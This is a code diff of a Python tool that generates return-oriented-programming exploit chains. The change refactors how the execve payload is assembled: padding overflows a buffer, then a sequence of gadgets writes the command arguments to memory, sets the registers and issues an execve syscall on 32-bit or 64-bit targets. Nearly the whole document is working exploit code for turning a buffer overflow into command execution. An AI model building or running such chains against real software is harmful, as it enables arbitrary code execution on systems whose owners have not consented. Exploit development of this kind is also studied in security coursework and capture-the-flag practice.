@@ -47,6 +47,7 @@ def CreateROPChain(command, bufflength, gadgetfile, bits):
     if WORD_LEN != 4 and WORD_LEN != 8:
         print("Unknown Bit Number")
         quit()
+
     if WORD_LEN == 4:
        print("Loading 32bit Mode...")
        DATA_ADDRESS = 0x080da060
@@ -76,78 +77,88 @@ def CreateROPChain(command, bufflength, gadgetfile, bits):
     return None
 
 
+def WriteAsChain(Gadgets, bufflength):
+    chain = b'A' * bufflength
+    for g in Gadgets:
+        chain += pack(PACK_TYPE, A2R(g))
+    return chain
+
 def execve(arguments, bufflength):
     #add buffer string
-    payload = b'A' * bufflength
+    payload = []
 
     #set up data
     print(arguments)
     endoffset = 0
     for arg in arguments:
         argbytes, offset = AddArgument(arg)
-        payload += argbytes
+        payload.extend(argbytes)
         endoffset += offset
     print(endoffset)
     
     #Write NULL dword
-    payload += pack(PACK_TYPE, A2R("pop " +STACK_BUILD_REGISTER+ " ; ret"))
-    payload += pack(PACK_TYPE, DATA_ADDRESS + 8) # 8 or endoffset?
-    payload += pack(PACK_TYPE, A2R("xor "+A_REGISTER+", "+A_REGISTER+" ; ret")) # set eax to 0
-    payload += pack(PACK_TYPE, A2R("mov "+WORD_TYPE+" ptr ["+STACK_BUILD_REGISTER+"], "+A_REGISTER+" ; ret")) # move eax into location at edx
+    payload.append("pop " +STACK_BUILD_REGISTER+ " ; ret")
+    payload.append(DATA_ADDRESS + 8) # 8 or endoffset?
+    payload.append("xor "+A_REGISTER+", "+A_REGISTER+" ; ret") # set eax to 0
+    payload.append("mov "+WORD_TYPE+" ptr ["+STACK_BUILD_REGISTER+"], "+A_REGISTER+" ; ret") # move eax into location at edx
 
     #load arguments to registers? (needs a 32bit and 64bit version)
     if WORD_LEN == 4:
-        payload += pack(PACK_TYPE, A2R("pop ebx ; ret")) #pop ebx 
-        payload += pack(PACK_TYPE, DATA_ADDRESS) #put data address in ebx
-        payload += pack(PACK_TYPE, A2R("pop ecx ; pop ebx ; ret")) #pop ecx and ebx
-        payload += pack(PACK_TYPE, DATA_ADDRESS + 8) #put end of data into ecx (8 or endoffset?)
-        payload += pack(PACK_TYPE, DATA_ADDRESS) #put start of data in ebx?
-        payload += pack(PACK_TYPE, A2R("pop edx ; ret")) #pop edx
-        payload += pack(PACK_TYPE, DATA_ADDRESS + 8) #put end of data into edx? (8 or endoffset?)
+        payload.append("pop ebx ; ret") #pop ebx 
+        payload.append(DATA_ADDRESS) #put data address in ebx
+        payload.append("pop ecx ; pop ebx ; ret") #pop ecx and ebx
+        payload.append(DATA_ADDRESS + 8) #put end of data into ecx (8 or endoffset?)
+        payload.append(DATA_ADDRESS) #put start of data in ebx?
+        payload.append("pop edx ; ret") #pop edx
+        payload.append(DATA_ADDRESS + 8) #put end of data into edx? (8 or endoffset?)
 
     if WORD_LEN == 8:
-        payload += pack(PACK_TYPE, A2R("pop rdi ; ret"))
-        payload += pack(PACK_TYPE, DATA_ADDRESS)
-        payload += pack(PACK_TYPE, A2R("pop rsi ; ret"))
-        payload += pack(PACK_TYPE, DATA_ADDRESS + 8)
-        payload += pack(PACK_TYPE, A2R("pop rdx ; ret"))
-        payload += pack(PACK_TYPE, DATA_ADDRESS + 8)
+        payload.append("pop rdi ; ret")
+        payload.append(DATA_ADDRESS)
+        payload.append("pop rsi ; ret")
+        payload.append(DATA_ADDRESS + 8)
+        payload.append("pop rdx ; ret")
+        payload.append(DATA_ADDRESS + 8)
 
     #set eax to execve
-    payload += SetAReg(EXECVE_VALUE)
+    payload.extend(SetAReg(EXECVE_VALUE))
 
     #syscall
-    payload += pack(PACK_TYPE, A2R(SYSCALL))
+    payload.append(SYSCALL)
 
-    return payload
+    return WriteAsChain(payload, bufflength)
 
 def AddArgument(argument):
     numwords = int(len(argument) / WORD_LEN) #assumes word alignment of arguments
-    arg = b''
+    arg = ""
     if type(argument) is str:
-        arg = argument.encode("utf-8")
+        arg = argument
     if type(argument) is bytes:
         arg = argument
-    s = b''
+    s = []
     for i in range(numwords):
-        s += pack(PACK_TYPE, A2R("pop "+STACK_BUILD_REGISTER+" ; ret"))
-        s += pack(PACK_TYPE, DATA_ADDRESS + (i * WORD_LEN))
-        s += pack(PACK_TYPE, A2R("pop "+A_REGISTER+" ; ret"))
-        s += arg[i*WORD_LEN:(i+1)*WORD_LEN]
-        s += pack(PACK_TYPE, A2R("mov "+WORD_TYPE+" ptr ["+STACK_BUILD_REGISTER+"], "+A_REGISTER+" ; ret"))
+        s.append("pop "+STACK_BUILD_REGISTER+" ; ret")
+        s.append(DATA_ADDRESS + (i * WORD_LEN))
+        s.append("pop "+A_REGISTER+" ; ret")
+        s.append(arg[i*WORD_LEN:(i+1)*WORD_LEN].encode("utf-8"))
+        s.append("mov "+WORD_TYPE+" ptr ["+STACK_BUILD_REGISTER+"], "+A_REGISTER+" ; ret")
     return s, numwords * WORD_LEN
 
 def SetAReg(value):
-    s = pack(PACK_TYPE, A2R("xor "+A_REGISTER+", "+A_REGISTER+" ; ret"))
+    s = ["xor "+A_REGISTER+", "+A_REGISTER+" ; ret"]
     for i in range(value):
         if WORD_LEN == 4:
-            s += pack(PACK_TYPE, A2R("inc eax ; ret"))
+            s.append("inc eax ; ret")
         if WORD_LEN == 8:
-            s += pack(PACK_TYPE, A2R("add rax, 1 ; ret"))
+            s.append("add rax, 1 ; ret")
     return s
 
 def A2R(instruction):
-    #Assembly to ROP    
+    #Assembly to ROP
+    if type(instruction) is int:
+        return instruction
+    if type(instruction) is bytes:
+        return int.from_bytes(instruction, byteorder='little')
     return int(gadgetdictionary[instruction], 0)
 
 
